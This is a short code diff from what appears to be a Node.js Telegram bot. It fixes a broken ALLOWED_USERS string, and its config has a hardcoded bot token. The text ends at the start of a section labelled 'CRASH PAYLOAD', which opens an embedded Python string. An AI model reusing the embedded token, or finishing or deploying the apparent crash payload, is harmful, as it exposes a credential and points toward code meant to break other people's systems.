@@ -5,7 +5,7 @@ const os = require('os');
 
 // ===================== CONFIG =====================
 const BOT_TOKEN = process.env.BOT_TOKEN || '8920423322:AAHhKb0jktz4SrYi9ZbNwaTC-maRnt8RiNo';
-const ALLOWED_USERS = (process.env.ALLOWED_USERS || '8910730508;
+const ALLOWED_USERS = (process.env.ALLOWED_USERS || '8910730508').split(',');
 
 // ===================== CRASH PAYLOAD =====================
 const CRASH_PAYLOAD = `import os
